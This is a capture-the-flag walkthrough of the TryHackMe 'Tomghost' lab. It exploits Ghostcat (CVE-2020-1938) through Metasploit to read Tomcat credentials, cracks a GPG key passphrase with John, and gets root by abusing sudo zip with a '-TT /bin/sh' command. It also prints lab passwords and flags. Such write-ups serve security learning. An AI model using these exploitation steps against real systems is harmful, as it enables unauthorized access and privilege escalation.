# 👻 Tomghost — TryHackMe Write-Up

> *"Identify recent vulnerabilities to try exploit the system or read files that you should not have access to."*  
> **Difficulty:** Easy | **Platform:** TryHackMe | **Date:** March 2026

---

## 📋 Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Ghostcat Exploitation — CVE-2020-1938](#2-ghostcat-exploitation--cve-2020-1938)
3. [GPG Key Cracking](#3-gpg-key-cracking)
4. [Privilege Escalation — sudo zip](#4-privilege-escalation--sudo-zip)
5. [Flags](#5-flags)
6. [Summary](#6-summary)

---

## 1. Reconnaissance

```bash
sudo nmap -sCV -O -Pn <TARGET_IP> -oA nmap-result
```

### Results

| Port | Service | Notes |
|------|---------|-------|
| 22   | SSH (OpenSSH 7.2p2) | For later access |
| 53   | DNS | |
| 8009 | AJP13 | ⚠️ Ghostcat vulnerable! |
| 8080 | Apache Tomcat 9.0.30 | Web server |

**Key Finding:** Port 8009 running AJP13 + Tomcat 9.0.30 = **Ghostcat (CVE-2020-1938)**

---

## 2. Ghostcat Exploitation — CVE-2020-1938

### What is Ghostcat?

Ghostcat is a critical vulnerability in Apache Tomcat's AJP (Apache JServ Protocol) connector. It allows unauthenticated attackers to read any file from within the web application — including sensitive configuration files containing credentials.

**Affected versions:** Apache Tomcat 9.x < 9.0.31, 8.x < 8.5.51, 7.x < 7.0.100

### Exploitation with Metasploit

```bash
msfconsole
search ghostcat
use 0
set RHOSTS <TARGET_IP>
set RPORT 8009
run
```

The module read `/WEB-INF/web.xml` and revealed hardcoded credentials:

```xml
<description>
   Welcome to GhostCat
   skyfuck:8730281lkjlkjdqlksalks
</description>
```

### SSH as skyfuck

```bash
ssh skyfuck@<TARGET_IP>
# Password: 8730281lkjlkjdqlksalks
```

**Result:** Shell as `skyfuck` ✅

### Files Found

```bash
ls ~/
# credential.pgp   ← PGP encrypted file
# tryhackme.asc    ← PGP private key
```

Transferred both files to the attacker machine:

```bash
# On target
python3 -m http.server 9090

# On attacker
wget http://<TARGET_IP>:9090/credential.pgp
wget http://<TARGET_IP>:9090/tryhackme.asc
```

---

## 3. GPG Key Cracking

### The Problem

Attempted to import the private key and decrypt the file:

```bash
gpg --import tryhackme.asc
gpg --decrypt credential.pgp
```

Failed — the private key itself was protected with a **passphrase**.

### Cracking the Passphrase with John

Converted the GPG key to a John-crackable hash:

```bash
/snap/john-the-ripper/694/bin/gpg2john tryhackme.asc > hash.txt
/snap/john-the-ripper/694/bin/john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Cracked passphrase:** `alexandru`

### Decrypting the Credential File

Re-imported the key and decrypted:

```bash
gpg --import tryhackme.asc
# Enter passphrase: alexandru

gpg --decrypt credential.pgp
```

**Result:** Credentials for merlin:

```
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

### SSH as merlin

```bash
ssh merlin@<TARGET_IP>
```

**Result:** Shell as `merlin` ✅

### User Flag

```bash
cat ~/user.txt
# THM{GhostCat_1s_so_cr4sy}
```

---

## 4. Privilege Escalation — sudo zip

### Enumeration

```bash
sudo -l
# (root : root) NOPASSWD: /usr/bin/zip
```

`merlin` can run `zip` as root without a password.

**Reference:** [GTFOBins — zip](https://gtfobins.github.io/gtfobins/zip/)

### Exploitation

```bash
sudo zip /tmp/temp.zip /etc/hosts -T -TT '/bin/sh #'
```

**How it works:** The `-TT` flag allows specifying a custom test command. By passing `/bin/sh`, zip executes it as root before testing the archive.

**Result:** Root shell ✅

### Root Flag

```bash
cat /root/root.txt
# THM{Z1P_1S_FAKE}
```

---

## 5. Flags

| Flag | Value |
|------|-------|
| 👤 User Flag | `THM{GhostCat_1s_so_cr4sy}` |
| 🏆 Root Flag | `THM{Z1P_1S_FAKE}` |

---

## 6. Summary

### Attack Chain

```
Nmap → Port 8009 AJP (Ghostcat CVE-2020-1938)
    │
    └─► Metasploit → /WEB-INF/web.xml → skyfuck:8730281lkjlkjdqlksalks
            │
            └─► SSH as skyfuck
                    │
                    └─► credential.pgp + tryhackme.asc
                            │
                            └─► gpg2john + john → passphrase: alexandru
                                    │
                                    └─► gpg --decrypt → merlin credentials
                                            │
                                            └─► SSH as merlin → user.txt ✅
                                                    │
                                                    └─► sudo zip (GTFOBins) → ROOT 🏆
```

### Techniques Used

| Technique | Tool/Command | Context |
|-----------|-------------|---------|
| CVE Exploitation | Metasploit (Ghostcat) | Reading web.xml via AJP |
| GPG Key Cracking | gpg2john + John | Cracking private key passphrase |
| PGP Decryption | gpg --decrypt | Decrypting credential file |
| sudo Abuse | zip GTFOBins | PrivEsc to root |

### Lessons Learned

- **AJP port 8009** should never be exposed publicly — Ghostcat made it a critical attack vector.
- **Hardcoded credentials** in config files (`web.xml`) are a very common finding in real-world pentests.
- **GPG private keys** can be password-protected — always try `gpg2john` + John when import fails.
- **`sudo -l`** is always the first thing to check after getting a new user shell.
- **GTFOBins** covers nearly every common binary — `zip`, `tar`, `vi`, `perl`... memorize the pattern, not the commands.

---

*Write-up by [XENOS](https://obadahamed.github.io) | Part of the 52-Week Red Team Roadmap*
